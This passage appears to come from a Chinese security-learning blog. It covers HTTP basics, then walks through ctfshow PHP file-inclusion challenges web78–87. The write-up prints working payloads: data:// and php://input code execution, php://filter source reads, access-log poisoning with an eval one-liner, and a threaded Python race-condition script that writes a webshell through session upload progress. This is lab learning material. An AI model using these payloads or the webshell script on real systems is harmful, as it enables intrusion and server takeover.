码。例如：\n\n- 空格（ASCII 码为 32，十六进制为 20）编码为 `%20`。\n- 中文字符 `中` 的 UTF-8 编码为 `E4 B8 AD`，因此 URL 编码为 `%E4%B8%AD`。\n\n| **字符** | **描述** | **URL 编码** |\n| -------- | -------- | ------------ |\n| 空格     | 空格符   | `%20`        |\n| !        | 感叹号   | `%21`        |\n| \"        | 双引号   | `%22`        |\n| #        | 井号     | `%23`        |\n| $        | 美元符号 | `%24`        |\n| %        | 百分号   | `%25`        |\n| &        | 与号     | `%26`        |\n| '        | 单引号   | `%27`        |\n| (        | 左括号   | `%28`        |\n| )        | 右括号   | `%29`        |\n| *        | 星号     | `%2A`        |\n| +        | 加号     | `%2B`        |\n| ,        | 逗号     | `%2C`        |\n| /        | 斜杠     | `%2F`        |\n| :        | 冒号     | `%3A`        |\n| ;        | 分号     | `%3B`        |\n| =        | 等号     | `%3D`        |\n| ?        | 问号     | `%3F`        |\n| @        | At 符号  | `%40`        |\n| [        | 左方括号 | `%5B`        |\n| ]        | 右方括号 | `%5D`        |\n\n### 请求头介绍\n\n**请求头（Request Headers）** 是 HTTP 请求的一部分，用于向服务器传递额外的信息。它们以键值对的形式存在，提供了关于客户端、请求内容、缓存策略等方面的详细信息。\n\n请求头的存在有助于客户端与服务器之间的有效通信。通过请求头，客户端可以告诉服务器许多关于自己的信息，如浏览器类型、操作系统、所支持的内容格式等。这使得服务器能够根据这些信息，生成针对性的、优化的响应。\n\n组成格式\n\n一个标头包括它的名称（不区分大小写），一个冒号（`:`），可选且会被忽略的空格，最后是它的值（例如 `Allow: POST`）。\n\n常用请求头大全\n\n### **HTTP 请求头大全**\n\n| **分类**         | **请求头**                  | **说明**                                                     | **示例**                                                     |\n| :--------------- | :-------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |\n| **通用请求头**   | `Host`                      | 指定服务器的域名和端口号。                                   | `Host: example.com`                                          |\n|                  | `User-Agent`                | 标识客户端（如浏览器、爬虫）的类型和版本。                   | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)`      |\n|                  | `Accept`                    | 指定客户端希望接收的内容类型（MIME 类型）。                  | `Accept: text/html,application/xhtml+xml`                    |\n|                  | `Accept-Language`           | 指定客户端希望接收的语言。                                   | `Accept-Language: en-US,en;q=0.9`                            |\n|                  | `Accept-Encoding`           | 指定客户端希望接收的内容编码（如压缩格式）。                 | `Accept-Encoding: gzip, deflate, br`                         |\n|                  | `Connection`                | 控制连接的行为，如是否保持连接。                             | `Connection: keep-alive`                                     |\n|                  | `Cache-Control`             | 指定缓存策略。                                               | `Cache-Control: no-cache`                                    |\n|                  | `Pragma`                    | 用于向后兼容 HTTP/1.0 的缓存控制。                           | `Pragma: no-cache`                                           |\n|                  | `Upgrade-Insecure-Requests` | 指示客户端希望将不安全的 HTTP 请求升级为 HTTPS。             | `Upgrade-Insecure-Requests: 1`                               |\n|                  | **`Via`**                   | **用于记录请求或响应经过的代理服务器（正向代理/反向代理、网关、缓存等）路径信息**。 | `Via: ymzx.qq.com`                                           |\n| **请求内容相关** | `Content-Type`              | 指定请求体的内容类型（MIME 类型）。                          | `Content-Type: application/json`                             |\n|                  | `Content-Length`            | 指定请求体的长度（字节数）。                                 | `Content-Length: 348`                                        |\n|                  | `Content-Encoding`          | 指定请求体的编码方式（如压缩格式）。                         | `Content-Encoding: gzip`                                     |\n|                  | `Content-Language`          | 指定请求体的语言。                                           | `Content-Language: en-US`                                    |\n|                  | `Content-Location`          | 指定请求体的位置。                                           | `Content-Location: /path/to/resource`                        |\n|                  | `Content-Range`             | 指定请求体的范围（用于分块传输）。                           | `Content-Range: bytes 0-499/1234`                            |\n| **身份验证相关** | `Authorization`             | 传递身份验证信息（如 Bearer Token、Basic Auth）。            | `Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...` |\n|                  | `Cookie`                    | 传递客户端的 Cookie 信息。                                   | `Cookie: sessionId=abc123; username=john`                    |\n|                  | `Proxy-Authorization`       | 用于代理服务器的身份验证。                                   | `Proxy-Authorization: Basic YWxhZGRpbjpvcGVuc2VzYW1l`        |\n| **条件请求相关** | `If-Modified-Since`         | 指定资源的最后修改时间，用于条件请求。                       | `If-Modified-Since: Mon, 10 Oct 2022 12:00:00 GMT`           |\n|                  | `If-None-Match`             | 指定资源的 ETag，用于条件请求。                              | `If-None-Match: \"abc123\"`                                    |\n|                  | `If-Unmodified-Since`       | 指定资源的最后修改时间，用于条件请求。                       | `If-Unmodified-Since: Mon, 10 Oct 2022 12:00:00 GMT`         |\n|                  | `If-Match`                  | 指定资源的 ETag，用于条件请求。                              | `If-Match: \"abc123\"`                                         |\n|                  | `If-Range`                  | 指定资源的 ETag 或最后修改时间，用于范围请求。               | `If-Range: \"abc123\"`                                         |\n| **其他请求头**   | `Referer`                   | 指定请求的来源页面。                                         | `Referer: https://example.com/page`                          |\n|                  | `Origin`                    | 指定请求的来源（用于跨域请求）。                             | `Origin: https://example.com`                                |\n|                  | `X-Requested-With`          | 标识请求是通过 AJAX 发送的。                                 | `X-Requested-With: XMLHttpRequest`                           |\n|                  | `DNT` (Do Not Track)        | 指示客户端是否启用“不跟踪”功能。                             | `DNT: 1`                                                     |\n|                  | `TE` (Transfer-Encoding)    | 指定客户端希望接收的传输编码。                               | `TE: trailers, deflate`                                      |\n| **自定义请求头** | `X-Forwarded-For`           | 标识客户端的原始 IP 地址（用于代理服务器）。                 | `X-Forwarded-For: 192.168.1.1`                               |\n|                  | `X-Forwarded-Proto`         | 标识客户端的原始协议（如 HTTP 或 HTTPS）。                   | `X-Forwarded-Proto: https`                                   |\n|                  | `X-Real-IP`                 | 标识客户端的真实 IP 地址。                                   | `X-Real-IP: 192.168.1.1`                                     |\n|                  | `X-Custom-Header`           | 自定义请求头，用于传递额外的信息。                           | `X-Custom-Header: value`                                     |\n|                  | **`Client-IP`**             | 直接标明代理提取的真实客户端 IP                              | `Client-IP: 1.2.3.4`                                         |\n\n### HTTP响应码大全\n\nHTTP 响应码（HTTP Status Codes）是服务器对客户端请求的响应状态的三位数字代码。它们分为五类，分别表示不同的响应类型。\n\n### **HTTP 响应码大全**\n\n| **分类**            | **响应码** | **名称**                                          | **说明**                                               |\n| :------------------ | :--------- | :------------------------------------------------ | :----------------------------------------------------- |\n| **1xx: 信息响应**   | 100        | Continue（继续）                                  | 客户端应继续发送请求的剩余部分。                       |\n|                     | 101        | Switching Protocols（切换协议）                   | 服务器已理解客户端的请求，并将切换到指定的协议。       |\n|                     | 102        | Processing（处理中）                              | 服务器已收到请求，但尚未完成处理。                     |\n|                     | 103        | Early Hints（早期提示）                           | 服务器返回部分响应头，提示客户端提前加载资源。         |\n| **2xx: 成功响应**   | 200        | OK（成功）                                        | 请求已成功处理。                                       |\n|                     | 201        | Created（已创建）                                 | 请求已成功处理，并创建了新资源。                       |\n|                     | 202        | Accepted（已接受）                                | 请求已接受，但尚未处理完成。                           |\n|                     | 203        | Non-Authoritative Information（非权威信息）       | 请求成功，但返回的元信息来自缓存或第三方。             |\n|                     | 204        | No Content（无内容）                              | 请求成功，但响应中没有内容。                           |\n|                     | 205        | Reset Content（重置内容）                         | 请求成功，客户端应重置文档视图。                       |\n|                     | 206        | Partial Content（部分内容）                       | 服务器成功处理了部分 GET 请求。                        |\n|                     | 207        | Multi-Status（多状态）                            | 返回多个状态码，通常用于 WebDAV。                      |\n|                     | 208        | Already Reported（已报告）                        | 资源的状态已在前面的响应中报告。                       |\n|                     | 226        | IM Used（IM 已使用）                              | 服务器已完成对资源的操作，并返回结果。                 |\n| **3xx: 重定向响应** | 300        | Multiple Choices（多种选择）                      | 请求的资源有多个选择，客户端应选择其中一个。           |\n|                     | 301        | Moved Permanently（永久重定向）                   | 请求的资源已永久移动到新位置。                         |\n|                     | 302        | Found（临时重定向）                               | 请求的资源临时移动到新位置。                           |\n|                     | 303        | See Other（查看其他位置）                         | 客户端应使用 GET 方法访问新位置。                      |\n|                     | 304        | Not Modified（未修改）                            | 资源未修改，客户端可使用缓存版本。                     |\n|                     | 305        | Use Proxy（使用代理）                             | 请求的资源必须通过代理访问。                           |\n|                     | 307        | Temporary Redirect（临时重定向）                  | 请求的资源临时移动到新位置，客户端应保持原请求方法。   |\n|                     | 308        | Permanent Redirect（永久重定向）                  | 请求的资源已永久移动到新位置，客户端应保持原请求方法。 |\n| **4xx: 客户端错误** | 400        | Bad Request（错误请求）                           | 请求无效，服务器无法理解。                             |\n|                     | 401        | Unauthorized（未授权）                            | 请求需要身份验证。                                     |\n|                     | 402        | Payment Required（需要付款）                      | 保留状态码，通常用于支付系统。                         |\n|                     | 403        | Forbidden（禁止访问）                             | 服务器拒绝请求。                                       |\n|                     | 404        | Not Found（未找到）                               | 请求的资源不存在。                                     |\n|                     | 405        | Method Not Allowed（方法不允许）                  | 请求的方法不被允许。                                   |\n|                     | 406        | Not Acceptable（不可接受）                        | 服务器无法生成客户端可接受的响应。                     |\n|                     | 407        | Proxy Authentication Required（需要代理认证）     | 客户端需要通过代理进行身份验证。                       |\n|                     | 408        | Request Timeout（请求超时）                       | 请求超时，服务器未收到完整请求。                       |\n|                     | 409        | Conflict（冲突）                                  | 请求与服务器的当前状态冲突。                           |\n|                     | 410        | Gone（已删除）                                    | 请求的资源已永久删除。                                 |\n|                     | 411        | Length Required（需要长度）                       | 请求需要指定 `Content-Length` 头。                     |\n|                     | 412        | Precondition Failed（前提条件失败）               | 请求的前提条件不满足。                                 |\n|                     | 413        | Payload Too Large（负载过大）                     | 请求的负载超过服务器限制。                             |\n|                     | 414        | URI Too Long（URI 过长）                          | 请求的 URI 过长，服务器无法处理。                      |\n|                     | 415        | Unsupported Media Type（不支持的媒体类型）        | 请求的媒体类型不被支持。                               |\n|                     | 416        | Range Not Satisfiable（范围无效）                 | 请求的范围无效。                                       |\n|                     | 417        | Expectation Failed（期望失败）                    | 请求的 `Expect` 头无法满足。                           |\n|                     | 418        | I'm a teapot（我是茶壶）                          | 幽默响应码，表示服务器是茶壶。                         |\n|                     | 421        | Misdirected Request（错误定向请求）               | 请求被错误定向到无法处理它的服务器。                   |\n|                     | 422        | Unprocessable Entity（无法处理的实体）            | 请求格式正确，但语义错误。                             |\n|                     | 423        | Locked（已锁定）                                  | 请求的资源被锁定。                                     |\n|                     | 424        | Failed Dependency（依赖失败）                     | 请求依赖于另一个请求，但该请求失败。                   |\n|                     | 425        | Too Early（过早）                                 | 服务器拒绝处理可能被重放的请求。                       |\n|                     | 426        | Upgrade Required（需要升级）                      | 客户端需要升级协议。                                   |\n|                     | 428        | Precondition Required（需要前提条件）             | 请求需要包含前提条件。                                 |\n|                     | 429        | Too Many Requests（请求过多）                     | 客户端发送了过多请求。                                 |\n|                     | 431        | Request Header Fields Too Large（请求头字段过大） | 请求头字段过大，服务器无法处理。                       |\n|                     | 451        | Unavailable For Legal Reasons（因法律原因不可用） | 请求的资源因法律原因不可用。                           |\n| **5xx: 服务器错误** | 500        | Internal Server Error（服务器内部错误）           | 服务器遇到意外错误，无法完成请求。                     |\n|                     | 501        | Not Implemented（未实现）                         | 服务器不支持请求的功能。                               |\n|                     | 502        | Bad Gateway（错误网关）                           | 服务器作为网关或代理时，从上游服务器收到无效响应。     |\n|                     | 503        | Service Unavailable（服务不可用）                 | 服务器暂时无法处理请求（通常由于过载或维护）。         |\n|                     | 504        | Gateway Timeout（网关超时）                       | 服务器作为网关或代理时，未及时从上游服务器收到响应。   |\n|                     | 505        | HTTP Version Not Supported（HTTP 版本不支持）     | 服务器不支持请求的 HTTP 版本。                         |\n|                     | 506        | Variant Also Negotiates（变体协商）               | 服务器内部配置错误。                                   |\n|                     | 507        | Insufficient Storage（存储不足）                  | 服务器无法存储完成请求所需的内容。                     |\n|                     | 508        | Loop Detected（检测到循环）                       | 服务器检测到无限循环。                                 |\n|                     | 510        | Not Extended（未扩展）                            | 请求需要进一步扩展。                                   |\n|                     | 511        | Network Authentication Required（需要网络认证）   | 客户端需要通过网络进行身份验证。                       |\n\n### Python发送http请求\n\n```py\n#HTTP请求的学习\nimport requests\n\nurl = \"https://www.baidu.com\"\n#GET请求\nr = requests.get(url = url)#无参数GET请求\n#r = requests.get(url = url,params = {'username':'admin','password':'admin123456'})#有参数GET请求\n\nprint(\"-----------分割线-------------\")\n\n#POST请求\n\nr = requests.post(url = url)#无参数POST请求\ndata = {\n    'username' : 'admin',\n    'password' : 'admin123456'\n}\nr = requests.post(url = url , data = data)#有参数POST请求\n\nprint(\"-----------分割线-------------\")\n\n#自定义请求头\n\n#headers请求头自定义\n\nheaders = {\n    \"User_Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64)\"\n}\nr = requests.post(url = url, headers = headers)#自定义请求头发送请求\n```\n\n### Python获取http信息\n\n```py\nimport requests\n\n#获取HTTP响应\n\nurl = \"https://www.baidu.com\"\nr = requests.get(url=url)\n#获取响应码\nprint(r.status_code)\n\n#获取响应文本\nprint(r.text)#text文本，返回的是页面的字符串信息，r.text 会自动将响应内容解码为字符串。\nprint(\"-------------------------------------------------------\")\nprint(r.content)#content文本，返回的是原始的字节数据\n\n#将字节数据转化成指定编码\n\nprint(r.content.decode('utf-8'))#可以看到这里编码后就和r.text一样了\n\n#获取响应头\nprint(\"-------------------------------------------------------\")\nprint(r.headers)\n\n\n#获取请求头\nprint(\"-------------------------------------------------------\")\nprint(r.request.headers)\n\n\n#获取请求url\nprint(\"-------------------------------------------------------\")\nprint(r.url)\n\n\n#获取cookie\nprint(\"-------------------------------------------------------\")\nprint(r.cookies)\n```\n\nPython获取页面Cookie\n\n```py\n#获取网页的会话session\nimport requests\n\nurl = \"https://www.baidu.com\"\n\ns = requests.Session()\nr = s.get(url)\nprint(r.cookies)\nprint(\"----------------------------------------------------------------------------------------\")\nprint(r.request.headers)\n#第一次请求的时候返回对应的cookie值，后面的请求中则会自动携带cookie\nr = s.get(url)\nprint(\"----------------------------------------------------------------------------------------\")\nprint(r.request.headers)\n#<RequestsCookieJar[<Cookie BDORZ=27315 for .baidu.com/>]>\n#----------------------------------------------------------------------------------------\n#{'User-Agent': 'python-requests/2.32.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': #'keep-alive'}\n#----------------------------------------------------------------------------------------\n#{'User-Agent': 'python-requests/2.32.3', 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': #'keep-alive', 'Cookie': 'BDORZ=27315'}\n```\n\n## 常见文件头举例\n\n| 文件类型    | 文件头（十六进制）                     | 说明                |\n| ----------- | -------------------------------------- | ------------------- |\n| JPEG (.jpg) | FF D8 FF                               | 标识 JPEG 图像      |\n| PNG (.png)  | 89 50 4E 47 0D 0A 1A 0A                | PNG 图片文件        |\n| GIF (.gif)  | 47 49 46 38 37 61 或 47 49 46 38 39 61 | GIF87a 或 GIF89a    |\n| PDF (.pdf)  | 25 50 44 46 2D                         | \"%PDF-\" 开头        |\n| ZIP (.zip)  | 50 4B 03 04                            | 压缩文件            |\n| RAR (.rar)  | 52 61 72 21 1A 07 00                   | 压缩文件            |\n| EXE (.exe)  | 4D 5A                                  | “MZ” 表示可执行文件 |\n| MP3 (.mp3)  | FF FB 或 ID3                           | 音频文件            |\n","tags":["基础知识"],"categories":["前置知识"]},{"title":"web入门文件包含篇-ctfshow","url":"/2024/12/03/web入门文件包含篇-ctfshow/","content":"\n这篇文章的知识点大部分已经移到另一篇文章了\n\n# 0x02题目\n\n## web78\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730028479242-bc1adeb6-66d3-4ccc-8872-1252551f0a4c.png)\n\n典型的文件包含**include()函数并不在意被包含的文件是什么类型，只要有php代码，都会被解析出来**。\n\n我们采用伪协议去做\n\n### php伪协议\n\n做法:\n\n做法一:采用data伪协议\n\n```\n?file=data://text/plain,<?php system('ls');?>\n\n?file=data://text/plain,<?php system('tac flag.php');?>\n```\n\n#### data://伪协议\n\ndata:// 是一个流封装器（stream wrapper），它允许你读取或写入数据作为文件流，而不是从实际的磁盘文件中，可以让用户来控制输入流，**当它与include()包含函数结合时，用户输入的data://流会被当作php文件执行**\n\n做法二:采用filiter\n\n```\n?file=php://filter/read=convert.base64-encode/resource=flag.php\n```\n\n利用filter协议读文件±，将flag.php通过base64编码后进行输出。这样做的好处就是如果不进行编码，文件包含后就不会有输出结果，而是当做php文件执行了，而通过编码后则可以读取文件源码。\n\n做法三:用input伪协议\n\n```\n?file=php://input并提交POST请求包数据:<?php system('ls');?>\n\n?file=php://input并提交POST请求包数据:<?php system('tac flag.php');?>\n```\n\n(可以用hackbar提交也可以用burpsuite进行提交)\n\n把传递方式改成POST方式，再添加php代码\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730285657191-4bfa4190-aaad-47f5-bdd2-6eb3ad56f460.png)\n\n### php://input\n\nphp://input    是个可以访问请求的原始数据的只读流。可以接收post请求作为输入流的输入，将请求作为PHP代码的输入传递给目标变量，以达到以post 的形式进行输入的目的。\n\n## web79\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730030606040-7bf50287-c040-4e27-b8e6-d2145f24eace.png)\n\n题目过滤了php，所以我们应该绕过php\n\n做法一:data 通配符绕过\n\n```\n?file=data://text/plain,<?=system('ls');?>\n\n?file=data://text/plain,<?=system('tac flag.???');?>\n```\n\n注意:如果是用?进行匹配，需要写成flag.???,如果是用*的话只需要fla*就行，因为*是匹配多个字符的，?只能匹配一个字符\n\n### php之\\<?= ?>\n\n```\n<? ?>`相当于对`<?php ?>`的替换。而`<?= ?>`则是相当于`<?php echo ... ?>\n```\n\n### 采用大小写绕过\n\n做法二:**input协议 大小写绕过**\n\n```\n?file=PhP://input\n\n<?PhP system('ls');?>\n\n?file=PhP://input\n\n<?PhP system('tac flag*');?>\n```\n\n以上两种方法都是可以绕过的，主要是看想用哪个\n\n## web80\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730032976505-90251105-1c5f-4a94-b1bd-9ece517a5765.png)\n\n这次data和php都被过滤了，由于不确定flag的位置，所以我们用input协议\n\n?file=Php://input上交然后用burpsuite抓包，并用POST提交一个\\<?=system('ls');?>\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730033474959-2d0a9681-3616-46dc-9aff-da7c9efb43b4.png)\n\n换成tac fl0g.???就可以了，也可以用大小写绕过\n\n还可以用日志文件包含\n\n访问?file=/var/log/nginx/access.log\n\n先添加user-agetn头:\n\n```\n<?=eval($_GET[2]);?>\n```\n\n执行`?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();`\n\n```\n?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();\n```\n\n寻找PHPinfo信息前面的那一段信息即可找到\n\n**url的请求也会被包含进去，所以在url中的马没法执行**\n\n因为：在get请求的数据会被url编码(`**<?**`)，在进入PHP之前不解码，所以无法当做PHP代码执行\n\n## web81\n\n### #日志文件包含\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730034742978-a281454d-c022-4ef8-b0fb-0949ae243cc3.png)\n\n这次居然连：都过滤了，那就不能用伪协议了，我们试一下日志注入\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730034980099-331bfbbb-173e-4fd7-bca3-926bf514ad24.png)\n\n发送两次得到文件目录\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730035074565-7869069e-1183-4604-b1dc-e2aa014ea974.png)\n\n可以看到里面有flag\n\n## web82\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730035246928-fd5d12ee-0eee-47db-a364-201f23135f87.png)\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730035297273-eaa66c84-0578-4323-bd02-cec7ece1fd69.png)\n\n这次过滤了.符号，意味着日志注入也不可以了，这次只能包含无后缀的文件了，我们php里面无后缀的文件就是session了\n\n### session文件包含\n\nSession文件包含是一种常见的安全漏洞，它允许攻击者通过包含恶意代码的Session文件来执行代码。这种漏洞的利用通常涉及到对Session的工作原理有深入的理解，以及对PHP配置和服务器环境的熟悉。\n\n#### Session的工作原理\n\n在PHP中，Session是用来保存用户数据的一种方式。当使用***session_start()\\***函数初始化Session时，PHP会在服务器上的特定路径下创建一个Session文件。这个路径可以在***php.ini\\***文件中通过***session.save_path\\***指定。Session文件通常以***sess_\\***为前缀，后面跟着一个Session ID。当用户再次访问网站时，服务器会通过这个Session ID来找到对应的Session文件，并加载其中的数据。\n\n#### **利用session.upload_progress进行文件包含**\n\n在php.ini有以下几个默认选项\n\n```plain\n1. session.upload_progress.enabled = on\n2. session.upload_progress.cleanup = on\n3. session.upload_progress.prefix = \"upload_progress_\"\n4. session.upload_progress.name = \"PHP_SESSION_UPLOAD_PROGRESS\"\n5. session.upload_progress.freq = \"1%\"\n6. session.upload_progress.min_freq = \"1\"\n```\n\n`enabled=on`表示`upload_progress`功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；\n\n`cleanup=on`表示当文件上传结束后，php将会立即清空对应session文件中的内容，这个选项非常重要；\n\n`name`当它出现在表单中，php将会报告上传进度，**最大的好处是，它的值可控；**\n\n`prefix+name`将表示为session中的键名\n\n另外，再添加个session配置中一个重要选项。\n\n`session.use_strict_mode=off`这个选项默认值为off，表示我们对Cookie中sessionid可控。这一点至关重要，下面会用到。\n\n#### 如何创建session文件呢。\n\n如果`session.auto_start=On` ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个选项都是关闭的。\n\n但session还有一个默认选项，session.use_strict_mode默认值为0。此时用户是可以自己定义Session ID的。比如，我们**在Cookie里设置PHPSESSID=TGAO，PHP将会在服务器上创建一个文件：/tmp/sess_TGAO**”。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(\"session.upload_progress.prefix\")+由我们构造的session.upload_progress.name值组成，最后被写入sess_TGAO里。\n\n#### 默认配置导致文件上传后，session文件内容立即清空，所以我们要想办法把session留在里面，所以就要利用条件竞争，在session文件内容清空前进行文件包含利用。\n\n#### 方法一 | 借助Burp Suite\n\n可以在本地写一个上传页面，然后抓包添加`Cookie: PHPSESSID=AndyNoel`，再用BurpSuite爆破，一边不断发包请求包含恶意的session，一边不断发包以维持恶意session存储。这样就可以利用条件竞争把恶意内容留在session里面了。\n\n### 条件竞争\n\n#### 概念\n\n条件竞争是指一个系统的运行结果依赖于不受控制的事件的先后顺序。当这些不受控制的事件并没有按照开发者想要的方式运行时，就可能会出现`bug`。尤其在当前我们的系统中大量对资源进行共享，如果处理不当的话，就会产生条件竞争漏洞。说的通俗一点，条件竞争涉及到的就是操作系统中所提到的进程或者线程同步的问题，当一个程序的运行的结果依赖于线程的顺序，处理不当就会发生条件竞争。\n\n#### 产生条件\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730035347028-159bb973-787f-4eb3-9057-2400233642cb.jpeg)\n\n开发人员通过检测文件后缀名，设置白名单黑名单各种方式判断用户上传文件是否为危险文件，一旦发现，就会立马发现。同样的，若是我们在判断和删除事件这一时间差内进行一些操作岂不是也会成功？\n\n### 利用PHP_SESSION_UPLOAD_PROGRESS加条件竞争进行文件包含\n\n1.POST请求上传一个文件并抓包\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730293603142-e3d26032-d061-411c-9f51-7cefb9e3eff1.png)\n\n这里我们添加一个 Cookie :PHPSESSID=flag ，PHP将会在服务器上创建一个文件：/tmp/sess_flag” （这里我们猜测session文件默认存储位置为/tmp），并在PHP_SESSION_UPLOAD_PROGRESS下添加一句话木马，修改如下\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730293746433-317ecf29-87ce-4113-8e0b-291f7f102dc5.png)\n\n因为我们在上面这个页面添加的ID值是flag，所以在题目url中传参?file=/tmp/sess_flag并抓包，修改如下：这个a是随便加的，主要是为了方便爆破\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730294322303-0b2b3651-e7a9-48c8-9eef-2708b8cc036a.png)\n\n然后将两个数据包都开启爆破，爆破结束后查看长度跟其他差距很大的response包，里面就可以看到回显信息\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730294307149-908a8a99-41f9-4eb5-beaa-34fd37f3b919.png)\n\n注意得先进行创建文件的POST包的爆破再进行查看文件的GET包的爆破\n\n后面改一下一句话木马改一下再重复爆破一次就出来flag了\n\n## web83\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730296283509-f13cd684-5eed-4a7a-9faf-134ddea05039.png)\n\n解析一下\n\nsession_destroy(): Trying to destroy uninitialized session in **/var/www/html/index.php** on line **14**\n\n在PHP中，`session_destroy()`函数用于销毁当前会话中的所有数据，并且会话ID也将不再被使用（除非手动重新生成一个新的会话ID）。然而，如果调用`session_destroy()`之前没有通过`session_start()`或其他方式初始化Session，就会出现这个警告。\n\nsession_unset()：\n\n释放当前在内存中已经创建的所有$_SESSION变量，但不删除session文件。\n\nsession_destroy()：\n\n删除当前用户对应的session文件以及释放sessionid\n\n但我们是自己创建的session，而条件竞争使用的是上传那一瞬间创建的 session，所以不影响。继续上一题的方法，但这里我们要另外讲一个方法\n\n### 用脚本:\n\n```python\nimport requests\nimport io\nimport threading\n\n\nurl='http://e4da427a-35da-400b-9d08-7134bc8bdb21.challenge.ctf.show/'\nsessionid='ctfshow'\ndata={\n    \"1\":\"file_put_contents('/var/www/html/muma.php','<?php eval($_POST[a]);?>');\"\n}  \n\n'''\npost 传递内容可在网站目录下写入一句话木马。\n根据资料，内容暂存在 /tmp/ 目录下 sess_sessionid 文件。\nsessionid 可控，所以这里即 /tmp/sess_ctfshow。\n这样一旦访问成功，就说明木马植入了\n'''\n\n\n# /tmp/sess_sessionid 中写入一句话木马。\ndef write(session):  \n    fileBytes = io.BytesIO(b'a'*1024*50)\n    while True:\n        response=session.post(\n            url,\n            data={\n                'PHP_SESSION_UPLOAD_PROGRESS':'<?php eval($_POST[1]);?>'\n            },\n            cookies={\n                'PHPSESSID':sessionid\n            },\n            files={\n                'file':('ctfshow.jpg',fileBytes)\n            }\n        )\n\n\n# 访问 /tmp/sess_sessionid，post 传递信息，保存新木马。\ndef read(session):\n    while True:\n        response=session.post(\n            url+'?file=/tmp/sess_'+sessionid,\n            data=data,\n            cookies={\n                'PHPSESSID':sessionid\n            }\n        )\n        # 访问木马文件，如果访问到了就代表竞争成功\n        resposne2=session.get(url+'muma.php')\n        if resposne2.status_code==200:\n            print('++++++done++++++')\n        else:\n            print(resposne2.status_code)\n\nif __name__ == '__main__':\n\n    evnet=threading.Event()\n    # 写入和访问分别设置 5 个线程。\n    with requests.session() as session:\n        for i in range(5):\n            threading.Thread(target=write,args=(session,)).start()\n        for i in range(5):\n            threading.Thread(target=read,args=(session,)).start()\n\n    evnet.set()\n```\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730300488029-894f411d-ee24-49ee-92a7-d07d0be5da74.png)\n\n出现这个之后代表竞争成功了\n\n我们就可以直接访问这个木马然后进行抓包，用POST提交(或者用蚁剑连接更快)\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730300529394-4081f140-02ec-4af6-9752-0690d78d07a4.png)\n\n然后再改成cat fl0g.php就能拿到flag了\n\n## web84\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730378443258-51ac2e09-3fb8-4d5d-8eab-d0f18e2c08cf.png)\n\n**system(rm -rf /tmp/\\*); 意思是会删除**该命令会删除（`rm`）`/tmp`目录下的所有文件和文件夹（`*`表示所有内容），并且不会询问确认（`-f`参数表示强制删除），同时递归地删除所有子目录及其内容（`-r`参数表示递归删除）。\n\n但如果我们用脚本去做的话，由于我们爆破的线程开的比较多，在get的请求线程1刚刚删除/tem/*，在上传的线程1中又写了进去了。简单来说就是，刚刚删除完就写进去了。所以我们可以正常用脚本去进行爆破\n\n## web85\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730380946270-8752299b-30ea-48a0-8e64-e2144a8d502b.png)\n\n先来了解一下file_get_contents函数和**strpos函数**\n\n### file_get_contents()函数\n\n 是 PHP 中的一个非常实用的函数，它用于将整个文件读入一个字符串中。这个函数非常适合于读取小文件或者当你需要将文件内容作为一个字符串来处理时。\n\n用法:\n$content = file_get_contents('path/to/your/file.txt');\n\n### **strpos()函数**\n\n`strpos` 函数是 PHP 中用于查找字符串中特定字符或子字符串首次出现位置的内置函数。\n\n用法:\n\nint strpos ( string $haystack , mixed $needle [, int $offset = 0 ] )\n\n- `$haystack`：目标字符串，即要在其中查找的字符串。\n- `$needle`：要查找的字符或子字符串。\n- `$offset`：可选参数，表示从目标字符串的哪个位置开始查找。默认为 0，即从字符串的开头开始查找。\n\n好像对题目并没有什么影响，那就继续用\n\n## web86\n\n没什么区别，一样可以用脚本去做\n\n## web87\n\n![img](./../image/achieve/202411/文件包含--ctfshow/1730390601812-e5d1e52c-e755-433e-abac-2187befdff67.png)\n\n需要用GET传入一个参数file和用POST传入一个参数content，后面是对file参数内容的过滤\n\nfile_put_contents(urldecode($file), \"\\<?php die('大佬别秀了');?>\".$content);\n\n- 使用`file_put_contents`函数将字符串写入到由`$file`指定的文件中。在写入之前，`$file`经过了`urldecode`函数处理，这意味着如果文件名是URL编码的，它会被解码。写入的内容首先是`<?php die('大佬别秀了');?>`，这是一个PHP脚本，当文件被作为PHP执行时会立即终止执行并显示消息\"大佬别秀了\"。然后是变量`$content`的值。\n\n那么 file_put_contents 函数，将会往 $file 里写入 `<?php die('大佬别秀了');?>` 和我们 post 传入的 $content 内容。\n\n这时候我们可以想到file参数被过滤了很多东西，所以我们可以在content参数中传入一句话木马，但由于会同时写入一个die指令，这时候就需要我们去绕过这个死亡函数了\n\n由于这个die()函数的执行没有什么条件，所以还是不太好处理的，于是我就去翻阅了大量wp进行总结\n\n解题方法:\n\n### php://filter 